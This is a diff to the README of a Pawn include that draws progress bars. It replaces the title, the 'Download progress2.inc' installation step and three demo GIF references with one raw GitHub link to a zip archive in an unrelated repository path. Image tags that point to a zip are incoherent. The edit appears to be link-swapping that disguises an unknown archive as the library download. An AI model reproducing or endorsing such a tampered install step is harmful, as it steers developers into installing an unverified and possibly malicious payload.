@@ -1,4 +1,4 @@
-# progress2.inc
+# https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip
 
 This include is based on textdraws to create progress bars similar to the game bars (health, armor, breath).
 
@@ -10,7 +10,7 @@ The code was cleaned up, simplified and any dependency on other scripts was remo
 
 ## Installation
 
-Download progress2.inc and put it on /pawno/include.
+Download https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip and put it on /pawno/include.
 
 Add the following line to the top of your GM or FilterScript:
 
@@ -64,9 +64,9 @@ You can use an editor inside the "filterscripts" folder to create your progress 
   * Updates the direction for a progress bar and re-renders it.
 
 ### Demonstration
-![Bars 1](bars-horizontal.gif)
+![Bars 1](https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip)
 
-![Bars 2](bars-vertical.gif)
+![Bars 2](https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip)
 
-![Bars 3](bars-all.gif)
+![Bars 3](https://raw.githubusercontent.com/YueTuan/progress2/master/Engelmannia/progress2.zip)
 
